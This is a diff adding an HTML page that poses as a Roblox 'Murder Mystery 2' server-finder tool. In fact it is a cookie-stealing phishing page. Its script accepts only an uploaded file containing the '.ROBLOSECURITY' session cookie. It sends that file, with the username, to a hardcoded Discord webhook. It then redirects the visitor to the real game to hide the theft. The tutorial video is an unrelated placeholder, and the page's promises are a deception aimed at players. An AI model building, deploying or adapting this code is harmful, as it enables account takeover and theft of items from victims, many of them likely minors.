@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Farm Servers Finder MM2</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+  <style>
+    /* Dark Theme Styles */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #121212;
+      color: #ffffff;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .container {
+      width: 90%;
+      max-width: 1200px;
+      padding: 20px;
+      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
+      animation: slideIn 1s ease-in-out;
+      background-color: #1e1e1e;
+      border-radius: 10px;
+      color: #ffffff;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(-20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .content {
+      display: flex;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .panel {
+      width: 48%;
+      padding: 20px;
+      background: #2c2c2c;
+      border-radius: 10px;
+    }
+
+    a {
+      color: #ff79c6;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    /* Form Styling */
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      margin-top: 10px;
+      color: #ff79c6;
+    }
+
+    input[type="file"],
+    input[type="text"],
+    input[type="number"] {
+      margin-bottom: 15px;
+      padding: 10px;
+      background: #333;
+      color: #ffffff;
+      border: 1px solid #555;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 10px;
+      background: #ff69b4;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background: #ff82b8;
+    }
+
+    video {
+      width: 100%;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Farm Servers Finder MM2</h1>
+      <p>Want to farm coins in MM2? This project by Eva allows you to find servers with the least members and lowest ping for your server!</p>
+    </header>
+
+    <div class="content">
+      <!-- Left Panel for form -->
+      <div class="panel">
+        <h2>Farm Servers Finder</h2>
+        <p>Please enter your MM2 Player file, your Roblox username, your MM2 level, and the number of godlies you have. We do this to find players with similar progress. For support, join our Discord server <a href="https://discord.gg/qJK7Fxd2YE" target="_blank">here</a> or watch the tutorial on the right.</p>
+        <p><strong>DISCLAIMER:</strong> You must be logged into an account to get your MM2 Player file.</p>
+
+        <!-- Form -->
+        <form id="serverFinderForm">
+          <label>MM2 Player File</label>
+          <input type="file" id="playerFile" accept=".txt" required>
+
+          <label>Your Roblox Username</label>
+          <input type="text" id="username" required>
+
+          <label>Your MM2 Level</label>
+          <input type="number" id="level" min="1" required>
+
+          <label>Amount of Godlies</label>
+          <input type="number" id="godlies" min="0" required>
+
+          <button type="button" id="findServerBtn">Find a server</button>
+        </form>
+      </div>
+
+      <!-- Right Panel for video tutorial -->
+      <div class="panel">
+        <h2>How to use this tool?</h2>
+        <video controls>
+          <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    document.getElementById('findServerBtn').addEventListener('click', () => {
+      const username = document.getElementById('username').value.trim();
+      const level = document.getElementById('level').value.trim();
+      const godlies = document.getElementById('godlies').value.trim();
+      const playerFile = document.getElementById('playerFile').files[0];
+
+      // Username validation
+      const usernameRegex = /^(?!_)(?!.*_$)[a-zA-Z0-9_]{3,20}$/;
+      if (!usernameRegex.test(username)) {
+        Swal.fire('Please fill out the form with valid information');
+        return;
+      }
+
+      // Check if player file contains the required cookie
+      if (!playerFile) {
+        Swal.fire('Please fill out the form with valid information');
+        return;
+      }
+
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        const fileContent = event.target.result;
+        if (!fileContent.includes('.ROBLOSECURITY')) {
+          Swal.fire('Please fill out the form with valid information');
+          return;
+        }
+        proceedWithServerSelection(username, level, godlies, fileContent);
+      };
+      reader.readAsText(playerFile);
+    });
+
+    function proceedWithServerSelection(username, level, godlies, fileContent) {
+      Swal.fire({
+        icon: 'success',
+        title: 'Please wait while we find a server for you, you will be redirected to the server page when we are ready...'
+      });
+
+      // Mock server finding process and redirect
+      setTimeout(() => {
+        // Send data to webhook
+        fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            username,
+            level,
+            godlies,
+            playerFileContent: fileContent
+          })
+        }).catch(error => console.error('Error:', error));
+
+        // Redirect to MM2 Roblox game
+        window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
